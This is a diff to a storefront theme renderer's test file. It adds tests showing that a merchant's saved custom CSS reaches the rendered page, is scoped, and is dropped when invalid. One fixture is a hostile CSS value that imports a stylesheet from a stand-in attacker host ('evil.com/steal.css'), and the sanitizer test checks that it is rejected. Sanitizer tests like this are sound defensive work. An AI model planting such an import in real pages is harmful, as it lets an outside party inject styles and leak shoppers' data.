@@ -13,12 +13,12 @@ import {
 
 const STORE_ID = '11111111-1111-4111-8111-111111111111';
 
-function renderUrbanKicks(extraBundle = {}) {
+function renderUrbanKicks(extraBundle = {}, storeTemplateOverrides = {}) {
   const renderer = new LiquidRenderer();
   const bundle = { ...createUrbanKicksLiquidThemeBundleFixture(), ...extraBundle };
   return renderer.render({
     context: { storeId: STORE_ID, subdomain: 'local-kicks', path: '/', previewMode: true, locale: 'en' },
-    storeTemplate: { storeId: STORE_ID, themeId: 'urban-kicks-liquid', themeSettings: DEFAULT_THEME_SETTINGS, sections: [] },
+    storeTemplate: { storeId: STORE_ID, themeId: 'urban-kicks-liquid', themeSettings: DEFAULT_THEME_SETTINGS, sections: [], ...storeTemplateOverrides },
     routeTemplate: { id: 'index', type: 'index', layoutKey: 'theme', sections: [] },
     liquidBundle: bundle,
   });
@@ -74,4 +74,33 @@ test('L2: buildLiquidThemeHeadAssets falls back safely and sanitizes token value
   assert.match(head, /<style[^>]*>/);
   assert.doesNotMatch(head, /body\{display:none/, 'token value must not inject extra rules');
   assert.match(head, /--font-display:/, 'all mapped tokens emitted');
+});
+
+test('SUSTAINED-G2: a merchant\'s saved custom CSS (storeTemplate.customCss) reaches the real rendered page', async () => {
+  // This is the actual wiring gap: buildLiquidThemeHeadAssets(bundle, css) was already proven
+  // correct at the unit level (custom-css-sanitizer.test.ts's AA-COMPAT-0x), but its only call
+  // site in LiquidRenderer.render() never passed a value, so no merchant's custom CSS ever
+  // reached a real render. This exercises the actual public entry point storefront pages use.
+  const result = await renderUrbanKicks({}, { customCss: '.hero { color: rebeccapurple; }' });
+  assert.equal(result.status, 'rendered');
+  const html = result.liquid?.layoutHtml ?? '';
+  assert.match(html, /<style[^>]*data-lb-custom-css="1"[^>]*>/, 'the custom-CSS style tag must appear in the rendered page');
+  assert.match(html, /rebeccapurple/, 'the merchant\'s actual CSS value must be present');
+  assert.match(html, /\.lb-theme\{/, 'custom CSS must be scoped, matching the existing sanitizer contract');
+});
+
+test('SUSTAINED-G2: invalid customCss on storeTemplate is dropped fail-closed through the real render, base styling unaffected', async () => {
+  const result = await renderUrbanKicks({}, { customCss: '@import url("https://evil.com/steal.css");' });
+  assert.equal(result.status, 'rendered');
+  const html = result.liquid?.layoutHtml ?? '';
+  assert.doesNotMatch(html, /<style[^>]*data-lb-custom-css="1"[^>]*>/, 'invalid custom CSS must never reach the rendered page');
+  assert.doesNotMatch(html, /evil\.com/, 'the malicious URL must not appear anywhere in the output');
+  assert.match(html, /<style[^>]*data-theme-renderer="liquid"[^>]*>/, 'the base theme style tag must still render normally');
+});
+
+test('SUSTAINED-G2: no customCss on storeTemplate renders byte-identical to before this phase', async () => {
+  const withoutCss = await renderUrbanKicks();
+  const withUndefinedCss = await renderUrbanKicks({}, { customCss: undefined });
+  assert.equal(withUndefinedCss.liquid?.layoutHtml, withoutCss.liquid?.layoutHtml, 'omitting customCss must not change rendered output');
+  assert.doesNotMatch(withoutCss.liquid?.layoutHtml ?? '', /data-lb-custom-css/, 'no custom-CSS tag without a value');
 });
